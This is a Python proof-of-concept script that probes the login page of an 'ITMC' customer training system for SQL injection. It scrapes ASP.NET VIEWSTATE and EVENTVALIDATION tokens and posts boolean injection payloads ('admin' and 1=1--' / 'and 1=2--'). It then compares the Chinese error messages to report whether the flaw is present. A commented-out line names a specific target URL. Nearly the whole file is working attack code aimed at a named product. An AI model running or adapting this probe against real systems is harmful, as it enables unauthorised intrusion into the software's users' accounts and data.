#!/usr/bin/env python

from ast import pattern
import re
import time
from tracemalloc import start
from urllib.request import proxy_bypass
from weakref import proxy
import requests
import urllib.parse
#import logging


#target = "http://zzds.itmc.org.cn/Cust/Login.aspx"

#proxies = {'http':'http://localhost:8080','https':'http://localhost:8080'}

payload_test1 = "admin\' and 1=1--"
payload_test2 = "admin\' and 1=2--"

def get_VIEWSTATE(r):
    pattern1 = r'VIEWSTATE\".*value=\".*\"'
    match=re.search(pattern1,r).group(0)
    pattern2=r'VIEWSTATE\" id=\"__VIEWSTATE\" value=\"'
    match1=re.split(pattern2,match)
    return match1[1][:-1]

def get_EVENTVALIDATION(r):
    pattern1=r'EVENTVALIDATION\".*value=\".*\"'
    match=re.search(pattern1,r).group(0);
    pattern2=r'EVENTVALIDATION\" id=\"__EVENTVALIDATION\" value=\"'
    match1=re.split(pattern2,match);
    return match1[1][:-1]; #返回_EVENTVALIDATION

def poc(target):
    s = requests.session()
    res = s.get(url=target)

    viewstate = get_VIEWSTATE(res.text)
    eventvalidation = get_EVENTVALIDATION(res.text)


    data1 = {'username':payload_test1,'password':'admin','__VIEWSTATE':viewstate, '__EVENTVALIDATION':eventvalidation, 'kuakaoLoginBtn':''}
    data2 = {'username':payload_test2,'password':'admin','__VIEWSTATE':viewstate, '__EVENTVALIDATION':eventvalidation, 'kuakaoLoginBtn':''}


    res_true = s.post(url=target, data=data1)
    res_false = s.post(url=target, data=data2)
    #print(res_true.text)
    #print(res_false.text)

    if "密码不正确" in res_true.text:
        if "帐号不存在" in res_false.text:
            print("SQL注入漏洞存在")
        else:
            print("SQL注入漏洞不存在")
    else:
        print("SQL注入漏洞不存在")


if __name__ == '__main__':
    target = str(input('请输入ITMC网点客户实训系统登陆页面的URL: '))
    poc(target)